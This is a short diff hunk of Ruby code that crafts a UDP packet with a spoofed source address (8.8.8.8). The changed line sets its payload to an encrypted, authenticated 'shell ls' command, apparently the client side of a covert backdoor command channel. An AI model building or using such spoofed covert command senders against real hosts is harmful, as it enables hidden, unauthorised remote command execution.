@@ -55,7 +55,7 @@ udp_pkt.udp_dst = 6886
 udp_pkt.udp_src = rand(0xffff)
 udp_pkt.ip_saddr = "8.8.8.8"
 udp_pkt.ip_daddr = "142.232.107.31"
-udp_pkt.payload = encrypt("#{AUTH_STRING} mode command stuff")
+udp_pkt.payload = encrypt("#{AUTH_STRING} shell ls")
 #check that commands have at least 3 split by space, sanitize inputs?
 #udp_pkt.payload = "hello this is a test"
 puts udp_pkt.payload.length
